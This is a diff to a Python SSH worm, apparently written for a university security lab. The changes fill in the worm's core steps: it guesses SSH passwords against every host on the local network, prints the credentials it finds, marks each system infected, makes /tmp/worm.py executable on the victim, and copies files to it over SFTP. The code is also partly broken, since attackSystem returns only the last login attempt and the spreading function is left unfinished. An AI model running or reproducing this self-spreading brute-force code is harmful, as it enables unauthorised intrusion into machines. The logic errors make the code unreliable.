@@ -36,7 +36,7 @@ def markInfected():
 	# Mark the system as infected. One way to do
 	# this is to create a file called infected.txt
 	# in directory /tmp/
-	f = open("/tmp/infected.txt","w+")
+	f = open("/home/cpsc/infected.txt","w+")
 	f.write("You have been infected")
 	f.close()
 
@@ -46,7 +46,7 @@ def markInfected():
 # to the victim system
 ###############################################################
 def spreadAndExecute(sshClient):
-
+	sshClient.exec_command("chmod a+x /tmp/worm.py")
 	# This function takes as a parameter
 	# an instance of the SSH class which
 	# was properly initialized and connected
@@ -57,7 +57,6 @@ def spreadAndExecute(sshClient):
 	# code we used for an in-class exercise.
 	# The code which goes into this function
 	# is very similar to that code.
-	pass
 
 
 ############################################################
@@ -77,13 +76,13 @@ def tryCredentials(host, userName, password, sshClient):
 	except socket.error:
 		print "Server is down"
 	except paramiko.SSHException:
-		print "Username: ", username
+		print "Username: ", userName
 		print "Password ", password
 		print "Credentials are not correct"
 	else:
 		print "Credentials are correct!"
 		sftpClient = sshClient.open_sftp()
-		return sftpClient
+		return (sshClient, sftpClient)
 
 	# Tries to connect to host host using
 	# the username stored in variable userName
@@ -132,7 +131,6 @@ def attackSystem(host):
 	for (username, password) in credList:
 
 		attemptResults = tryCredentials(host, username, password, ssh)
-		return attemptResults
 		# TODO: here you will need to
 		# call the tryCredentials function
 		# to try to connect to the
@@ -147,7 +145,7 @@ def attackSystem(host):
 		#pass
 
 	# Could not find working credentials
-	return None
+	return attemptResults
 
 ####################################################
 # Returns the IP of the current system
@@ -215,6 +213,10 @@ if len(sys.argv) < 2:
 
 # TODO: Get the IP of the current system
 selfIP = getMyIP("enp0s3")
+print "Self IP: ", selfIP
+
+#creating an Infected.txt
+markInfected()
 
 # Get the hosts on the same network
 networkHosts = getHostsOnTheSameNetwork()
@@ -224,9 +226,7 @@ networkHosts = getHostsOnTheSameNetwork()
 # do not want to target ourselves!).
 networkHosts.remove(selfIP)
 
-
 print "Found hosts: ", networkHosts
-
 
 # Go through the network hosts
 for host in networkHosts:
@@ -236,11 +236,18 @@ for host in networkHosts:
 
 	print sshInfo
 
-
 	# Did the attack succeed?
 	if sshInfo:
 
 		print "Trying to spread"
+		try:
+			print(sshInfo[1].stat(INFECTED_MARKER_FILE))
+			print('file exists')
+		except IOError:
+			remotepath = INFECTED_MARKER_FILE
+			localpath = '/home/cpsc/infected.txt'
+			print('copying file')
+			sshInfo[1].put(localpath, remotepath)
 
 		# TODO: Check if the system was
 		# already infected. This can be
